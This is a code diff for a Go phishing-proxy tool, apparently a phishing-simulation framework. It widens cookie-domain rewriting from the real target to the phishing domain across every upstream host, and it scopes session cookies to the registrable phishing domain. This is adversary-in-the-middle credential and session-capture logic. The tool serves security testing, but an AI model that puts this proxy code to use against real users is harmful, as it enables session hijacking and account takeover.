@@ -37,6 +37,7 @@ import (
 	"github.com/phishingclub/phishingclub/utils"
 	"github.com/phishingclub/phishingclub/vo"
 	"go.uber.org/zap"
+	"golang.org/x/net/publicsuffix"
 	"gopkg.in/yaml.v3"
 	"gorm.io/gorm"
 )
@@ -1078,14 +1079,20 @@ func (m *ProxyHandler) processCookiesForPhishingDomainWithContext(resp *http.Res
 		return
 	}
 
-	tempConfig := map[string]service.ProxyServiceDomainConfig{
-		reqCtx.TargetDomain: {To: reqCtx.PhishDomain},
+	// use the full host mapping so cookies from every upstream host in the flow
+	// are rewritten to their phishing counterpart, not only the primary host.
+	// fall back to the primary target to phish pair when no mapping is present.
+	config := reqCtx.ConfigMap
+	if len(config) == 0 {
+		config = map[string]service.ProxyServiceDomainConfig{
+			reqCtx.TargetDomain: {To: reqCtx.PhishDomain},
+		}
 	}
 
 	resp.Header.Del("Set-Cookie")
 	for _, ck := range cookies {
 		m.adjustCookieSettings(ck, reqCtx.Session, resp)
-		m.rewriteCookieDomain(ck, tempConfig, resp)
+		m.rewriteCookieDomain(ck, config, resp)
 		resp.Header.Add("Set-Cookie", ck.String())
 	}
 }
@@ -2978,31 +2985,6 @@ func (m *ProxyHandler) applyTargetFilter(selection *goquery.Selection, target st
 	return selection
 }
 
-func (m *ProxyHandler) processCookiesForPhishingDomain(resp *http.Response, ps *service.ProxySession) {
-	cookies := resp.Cookies()
-	if len(cookies) == 0 {
-		return
-	}
-
-	phishDomain := ps.Domain.Name
-	targetDomain, err := m.getTargetDomainForPhishingDomain(phishDomain)
-	if err != nil {
-		m.logger.Errorw("failed to get target domain for cookie processing", "error", err, "phishDomain", phishDomain)
-		return
-	}
-
-	tempConfig := map[string]service.ProxyServiceDomainConfig{
-		targetDomain: {To: phishDomain},
-	}
-
-	resp.Header.Del("Set-Cookie")
-	for _, ck := range cookies {
-		m.adjustCookieSettings(ck, nil, resp)
-		m.rewriteCookieDomain(ck, tempConfig, resp)
-		resp.Header.Add("Set-Cookie", ck.String())
-	}
-}
-
 func (m *ProxyHandler) adjustCookieSettings(ck *http.Cookie, session *service.ProxySession, resp *http.Response) {
 	if ck.Secure {
 		ck.SameSite = http.SameSiteNoneMode
@@ -3866,17 +3848,26 @@ func (m *ProxyHandler) setProxyConfigDefaults(config *service.ProxyServiceConfig
 	}
 }
 
-// extractTopLevelDomain extracts the top-level domain from a hostname
+// extractTopLevelDomain returns the registrable domain of a hostname, used to
+// scope the session cookie across all subdomains of the phishing domain.
 // e.g., "login.proxysaurous.test" -> "proxysaurous.test"
-// e.g., "assets-1.proxysaurous.test" -> "proxysaurous.test"
+// e.g., "login.evilcorp.co.uk" -> "evilcorp.co.uk"
 func (m *ProxyHandler) extractTopLevelDomain(hostname string) string {
-	parts := strings.Split(hostname, ".")
-	if len(parts) <= 2 {
-		// already a top-level domain or single word
+	// drop a port if the host carries one
+	if host, _, err := net.SplitHostPort(hostname); err == nil {
+		hostname = host
+	}
+	// an ip host has no registrable domain, use it as is
+	if net.ParseIP(hostname) != nil {
 		return hostname
 	}
-	// return the last two parts (domain.tld)
-	return parts[len(parts)-2] + "." + parts[len(parts)-1]
+	// the public suffix list yields the registrable domain, so multi label
+	// suffixes such as co.uk resolve to evilcorp.co.uk and not the suffix
+	if etldPlusOne, err := publicsuffix.EffectiveTLDPlusOne(hostname); err == nil {
+		return etldPlusOne
+	}
+	// single label hosts such as localhost have no registrable domain
+	return hostname
 }
 
 func (m *ProxyHandler) GetCookieName() string {
@@ -4042,35 +4033,6 @@ func (m *ProxyHandler) CleanupExpiredSessions() {
 	if ipCleanedCount > 0 {
 		m.logger.Debugw("cleaned up expired IP allow listed entries", "count", ipCleanedCount)
 	}
-}
-
-func (m *ProxyHandler) getTargetDomainForPhishingDomain(phishingDomain string) (string, error) {
-	if strings.Contains(phishingDomain, ":") {
-		phishingDomain = strings.Split(phishingDomain, ":")[0]
-	}
-
-	var dbDomain database.Domain
-	result := m.DomainRepository.DB.Where("name = ?", phishingDomain).First(&dbDomain)
-	if result.Error != nil {
-		return "", fmt.Errorf("failed to get domain configuration: %w", result.Error)
-	}
-
-	if dbDomain.Type != "proxy" {
-		return "", fmt.Errorf("domain is not configured for proxy")
-	}
-
-	if dbDomain.ProxyTargetDomain == "" {
-		return "", fmt.Errorf("no proxy target domain configured")
-	}
-
-	targetDomain := dbDomain.ProxyTargetDomain
-	if strings.Contains(targetDomain, "://") {
-		if parsedURL, err := url.Parse(targetDomain); err == nil {
-			return parsedURL.Host, nil
-		}
-	}
-
-	return targetDomain, nil
 }
 
 func (m *ProxyHandler) isValidSessionCookie(cookie string) bool {
